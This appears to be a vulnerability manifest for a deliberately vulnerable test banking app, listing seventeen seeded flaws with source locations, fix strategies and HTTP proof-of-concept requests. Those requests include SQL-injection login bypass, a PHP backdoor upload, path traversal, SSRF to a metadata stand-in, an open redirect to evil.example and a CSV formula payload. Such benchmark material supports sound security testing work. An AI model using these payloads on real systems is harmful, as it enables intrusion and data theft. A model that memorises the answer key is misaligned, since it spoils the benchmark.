version: 1
target: pythonbank
note: Generated by scripts/write_manifest.py; anchors are read from the real source. PoC predicates are Python expressions
  replayed by scripts/replay_poc.py against a booted target. Known-good patches for the fix loop are a follow-up;
  these PoCs prove presence, not yet neutralization.
vulns:
- id: VULN-001
  route: POST /api/auth/login
  category: sqli
  cwe: CWE-89
  severity: critical
  location:
    file: src/pythonbank/routes/auth.py
    symbol: login
    lines:
    - 51
  description: The username is concatenated into the login SQL string, so a UNION SELECT row with attacker-chosen
    columns authenticates as admin.
  poc:
    type: http
    request: |-
      POST /api/auth/login HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"username":"x' UNION SELECT 1,'admin','admin','admin@pythonbank.test' -- ","password":"x"}
    expect: HTTP 200 with a token whose decoded user has role admin
    expect_expr: status == 200 and json and json["user"]["role"] == "admin" and isinstance(json.get("token"), str)
  fix:
    strategy: parameterized_query
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-002
  route: POST /api/auth/login
  category: missing_rate_limit
  cwe: CWE-307
  severity: medium
  location:
    file: src/pythonbank/routes/auth.py
    symbol: login
    lines:
    - 39
  description: 'No throttling on the login handler: 12 consecutive bad-password attempts all reach the database
    and none is answered with 429.'
  poc:
    type: http
    request: |-
      POST /api/auth/login HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"username":"alice","password":"wrongpassword"}
    repeat: 12
    expect: 12 consecutive attempts, none answered with 429
    expect_expr: len(probe["runs"]) >= 12 and all(run["status"] == 401 for run in probe["runs"]) and all(run["status"]
      != 429 for run in probe["runs"])
  fix:
    strategy: rate_limit
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-003
  route: POST /api/auth/login
  category: user_enumeration
  cwe: CWE-204
  severity: medium
  location:
    file: src/pythonbank/routes/auth.py
    symbol: login
    lines:
    - 60
  description: Unknown-user and wrong-password failures return different messages and status codes, so valid usernames
    can be enumerated.
  poc:
    type: http
    request: |-
      POST /api/auth/login HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"username":"alice","password":"wrongpassword"}
    alt_body: '{"username":"definitely_not_a_user_xyz","password":"wrongpassword"}'
    expect: existing user -> 'wrong password'; unknown user -> 'no such user'
    expect_expr: json and json.get("error") == "wrong password" and json.get("field") == "password" and probe["alt_runs"][0]["json"].get("error")
      == "no such user"
  fix:
    strategy: uniform_response
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-004
  route: POST /api/auth/register
  category: weak_password_hash_md5
  cwe: CWE-916
  severity: high
  location:
    file: src/pythonbank/routes/auth.py
    symbol: register
    lines:
    - 28
  description: A freshly registered password is stored as an unsalted MD5, readable directly out of the database
    file.
  poc:
    type: http
    request: |-
      POST /api/auth/register HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"username":"hashtest_{{NONCE}}","password":"Known!Password1","email":"hashtest@pythonbank.test"}
    db: SELECT password_hash FROM users WHERE username = 'hashtest_{{NONCE}}'
    expect: the stored credential equals md5('Known!Password1')
    expect_expr: status == 201 and db == md5_hex("Known!Password1")
  fix:
    strategy: bcrypt
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-005
  route: GET /api/config
  category: hardcoded_secret
  cwe: CWE-798
  severity: high
  location:
    file: src/pythonbank/tokens.py
    symbol: TOKEN_SECRET
    lines:
    - 17
  description: 'The token signing secret is a literal in src/pythonbank/tokens.py, and it is the live credential:
    the same string signs tokens and is served by /api/config.'
  poc:
    type: http
    request: |
      GET /api/config HTTP/1.1
      Host: localhost:4003
    static_files:
    - src/pythonbank/tokens.py
    expect: the source literal equals the live signing secret
    expect_expr: static["src/pythonbank/tokens.py"].count("pythonbank-dev-secret-do-not-ship") >= 1 and json["token_secret"]
      == "pythonbank-dev-secret-do-not-ship"
  fix:
    strategy: env_required
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-006
  route: GET /api/config
  category: secret_exposure
  cwe: CWE-200
  severity: high
  location:
    file: src/pythonbank/routes/config.py
    symbol: get_config
    lines:
    - 20
  description: GET /api/config returns the signing secret and any PYTHONBANK_* environment variable to any caller,
    with no authentication.
  poc:
    type: http
    request: |
      GET /api/config HTTP/1.1
      Host: localhost:4003
    expect: the response contains the live signing secret
    expect_expr: status == 200 and json and json.get("token_secret") == "pythonbank-dev-secret-do-not-ship"
  fix:
    strategy: remove_or_authorise
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-007
  route: POST /api/admin/exec
  category: cmd_injection
  cwe: CWE-78
  severity: critical
  location:
    file: src/pythonbank/routes/tools.py
    symbol: admin_exec
    lines:
    - 24
  description: The admin command runner passes the request body to a shell. The admin token is forged with the secret
    that GET /api/config discloses, so no account is needed.
  poc:
    type: http
    request: |-
      POST /api/admin/exec HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json
      Authorization: Bearer {{FORGED_ADMIN_TOKEN}}

      {"cmd":"echo pythonbank-cmd-marker"}
    expect: the command runs and its stdout contains the marker
    expect_expr: status == 200 and "pythonbank-cmd-marker" in text
  fix:
    strategy: argument_vector
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-008
  route: POST /api/import
  category: unsafe_deserialization
  cwe: CWE-502
  severity: critical
  location:
    file: src/pythonbank/routes/serialize.py
    symbol: import_object
    lines:
    - 21
  description: The import endpoint base64-decodes the payload and unpickles it, so the payload chooses the code
    that runs during deserialization.
  poc:
    type: http
    request: |-
      POST /api/import HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"payload":"{{PICKLE_PAYLOAD}}"}
    expect: the pickle executes and its output is returned
    expect_expr: status == 200 and "pythonbank-pickle-marker" in text
  fix:
    strategy: safe_parser
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-009
  route: GET /api/files/
  category: path_traversal
  cwe: CWE-22
  severity: high
  location:
    file: src/pythonbank/routes/files.py
    symbol: download
    lines:
    - 36
  description: The download endpoint joins the caller's name onto the public directory and opens it as-is, so ../private/flag.txt
    walks out of the intended directory.
  poc:
    type: http
    request: |
      GET /api/files/?name=..%2Fprivate%2Fflag.txt HTTP/1.1
      Host: localhost:4003
    expect: the response contains the file stored outside the public directory
    expect_expr: status == 200 and "pythonbank-flag" in text
  fix:
    strategy: path_canonicalisation
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-010
  route: POST /api/files/upload
  category: unrestricted_file_type
  cwe: CWE-434
  severity: high
  location:
    file: src/pythonbank/routes/files.py
    symbol: upload
    lines:
    - 27
  description: The upload endpoint stores any filename with any extension; there is no type check before the bytes
    are written into the public directory.
  poc:
    type: http
    request: |
      POST /api/files/upload HTTP/1.1
      Host: localhost:4003
      Content-Type: multipart/form-data; boundary=pythonbankboundary

      --pythonbankboundary
      Content-Disposition: form-data; name="file"; filename="backdoor.phtml"
      Content-Type: application/x-php

      <?php echo "pythonbank-upload-marker"; ?>
      --pythonbankboundary--
    expect: a server-executable extension is accepted and stored
    expect_expr: status == 201 and json and json.get("stored") == "backdoor.phtml"
  fix:
    strategy: upload_allowlist
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-011
  route: POST /api/fetch
  category: ssrf
  cwe: CWE-918
  severity: high
  location:
    file: src/pythonbank/routes/proxy.py
    symbol: proxy_fetch
    lines:
    - 18
  description: The fetch proxy retrieves any URL the caller names, with no scheme, host or address restrictions,
    and returns the body.
  poc:
    type: http
    request: |-
      POST /api/fetch HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"url":"http://127.0.0.1:{{PROBE_PORT}}/ssrf-marker"}
    expect: the server fetches the attacker-chosen URL and returns its body
    expect_expr: status == 200 and "ssrf-marker-ok" in text
  fix:
    strategy: url_allowlist
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-012
  route: POST /api/fetch
  category: ssrf_metadata
  cwe: CWE-918
  severity: critical
  location:
    file: src/pythonbank/routes/proxy.py
    symbol: proxy_fetch
    lines:
    - 18
  description: 'The same proxy reaches the link-local metadata range: no block of 169.254.169.254 or equivalent,
    so instance credentials are readable. The replay serves a local stand-in for the metadata service.'
  poc:
    type: http
    request: |-
      POST /api/fetch HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json

      {"url":"http://127.0.0.1:{{PROBE_PORT}}/latest/meta-data/"}
    expect: the metadata document comes back through the proxy
    expect_expr: status == 200 and "ami-id=ami-pythonbankprobe" in text
  fix:
    strategy: url_allowlist
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-013
  route: GET /api/redirect
  category: open_redirect
  cwe: CWE-601
  severity: medium
  location:
    file: src/pythonbank/routes/redirect.py
    symbol: open_redirect
    lines:
    - 14
  description: The redirect endpoint takes its destination from the query string with no allowlist, so a link on
    the site can land the user on an attacker origin.
  poc:
    type: http
    request: |
      GET /api/redirect?next=http%3A%2F%2Fevil.example%2Flanding HTTP/1.1
      Host: localhost:4003
    expect: 302 with Location pointing at the attacker origin
    expect_expr: status in (301, 302, 303, 307) and headers.get("location") == "http://evil.example/landing"
  fix:
    strategy: redirect_allowlist
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-014
  route: GET /api/export/transactions.csv
  category: csv_injection
  cwe: CWE-1236
  severity: medium
  location:
    file: src/pythonbank/routes/export.py
    symbol: export_csv
    lines:
    - 31
  description: The CSV export concatenates the note field without escaping, so a note beginning with = reaches the
    spreadsheet as a live formula.
  poc:
    type: http
    setup: |-
      POST /api/transactions HTTP/1.1
      Host: localhost:4003
      Content-Type: application/json
      Authorization: Bearer {{ALICE_TOKEN}}

      {"to":2,"amount":1,"note":"=cmd|' /C calc'!A0"}
    request: |
      GET /api/export/transactions.csv HTTP/1.1
      Host: localhost:4003
      Authorization: Bearer {{ALICE_TOKEN}}
    expect: the exported line starts with an unescaped formula character
    expect_expr: status == 200 and "=cmd" in text
  fix:
    strategy: csv_escape
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-015
  route: GET /api/debug
  category: verbose_error
  cwe: CWE-209
  severity: medium
  location:
    file: src/pythonbank/routes/diagnostics.py
    symbol: debug_echo
    lines:
    - 22
  description: The diagnostics endpoint returns the full Python traceback to the caller, including paths and internals.
  poc:
    type: http
    request: |
      GET /api/debug HTTP/1.1
      Host: localhost:4003
    expect: 500 with a full traceback in the body
    expect_expr: status == 500 and "Traceback (most recent call last)" in text
  fix:
    strategy: generic_error
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-016
  route: GET /api/users/2
  category: idor
  cwe: CWE-639
  severity: high
  location:
    file: src/pythonbank/routes/users.py
    symbol: get_user
    lines:
    - 21
  description: Any authenticated user can read any account by changing the path id; there is no owner or role predicate
    on the query.
  poc:
    type: http
    request: |
      GET /api/users/2 HTTP/1.1
      Host: localhost:4003
      Authorization: Bearer {{ALICE_TOKEN}}
    expect: alice's token reads bob's account
    expect_expr: status == 200 and json and json.get("username") == "bob"
  fix:
    strategy: owner_check
  tests_that_must_stay_green:
  - tests/test_api.py
- id: VULN-017
  route: GET /api/reports/summary
  category: sqli
  cwe: CWE-89
  severity: critical
  location:
    file: src/pythonbank/core/reports.py
    symbol: department_summary
    lines:
    - 13
  description: The department rollup routes its query parameter into SQL that core.reports assembles by concatenation;
    the route itself never touches SQL, so a cross-module taint pass is what links the parameter to the sink.
  poc:
    type: http
    request: |
      GET /api/reports/summary?department=x%27%20GROUP%20BY%20department%20UNION%20SELECT%20%27interproc-marker%27%2C%201%2C%201%20--%20 HTTP/1.1
      Host: localhost:4003
      Authorization: Bearer {{ALICE_TOKEN}}
    expect: the UNION row injected through the department filter comes back
    expect_expr: status == 200 and "interproc-marker" in text
  fix:
    strategy: parameterized_query
  tests_that_must_stay_green:
  - tests/test_api.py
